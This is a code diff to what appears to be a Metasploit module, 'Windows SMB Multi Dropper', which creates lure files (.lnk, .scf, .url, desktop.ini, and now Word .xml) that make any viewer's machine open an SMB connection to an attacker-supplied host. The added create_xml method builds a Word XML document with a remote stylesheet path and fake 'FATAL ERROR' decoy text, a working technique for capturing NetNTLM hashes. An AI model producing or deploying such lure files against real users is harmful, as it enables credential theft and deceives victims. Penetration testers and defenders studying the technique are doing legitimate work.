@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
         'Name'          => 'Windows SMB Multi Dropper',
         'Description'   => %q{
           This module dependent on the given filename extension creates either
-          a .lnk, .scf, .url, desktop.ini file which includes a reference
+          a .lnk, .scf, .url, .xml, or desktop.ini file which includes a reference
           to the the specified remote host, causing SMB connections to be initiated
           from any user that views the file.
         },
@@ -21,20 +21,22 @@ class MetasploitModule < Msf::Auxiliary
         'Author'        =>
             [
               'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
-              'Lnk Creation Code by Mubix'          #Lnk Creation Code written by Mubix
+              'Lnk Creation Code by Mubix',         #Lnk Creation Code written by Mubix
+              'asoto-r7'                            #Word XML creation code
             ],
         'Platform'      => [ 'win' ],
         'References'    =>
         [
           ['URL', 'https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018'],
-          ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/']
+          ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/'],
+          ['URL', 'https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/'],
         ]
 
       ))
     register_options(
       [
         OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
-        OptString.new("FILENAME", [ true, "Filename - supports *.lnk, *.scf, *.url, desktop.ini", "word.lnk"]),
+        OptString.new("FILENAME", [ true, "Filename - supports *.lnk, *.scf, *.url, *.xml, desktop.ini", "word.lnk"]),
       ])
   end
 
@@ -47,6 +49,10 @@ class MetasploitModule < Msf::Auxiliary
         create_desktopini
     elsif datastore['FILENAME'].chars.last(3).join=="url"
         create_url
+    elsif datastore['FILENAME'].chars.last(3).join=="xml"
+        create_xml
+    else
+        fail_with(Failure::BadConfig,"Invalid FILENAME option")
     end
   end
 
@@ -135,6 +141,18 @@ class MetasploitModule < Msf::Auxiliary
     url << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
 
     file_create(url)
+  end
+
+  def create_xml
+    xml=""
+    xml << "<?xml version='1.0' encoding='utf-8' ?>"
+    xml << "<?mso-application progid='Word.Document'?>"
+    xml << "<?xml-stylesheet type='text/xsl' href='file://#{datastore['LHOST']}/share/word.xsl'?>"
+    xml << "<Text>"
+    xml << " FATAL ERROR: The document failed to render properly."
+    xml << "</Text>"
+
+    file_create(xml)
   end
 
 end
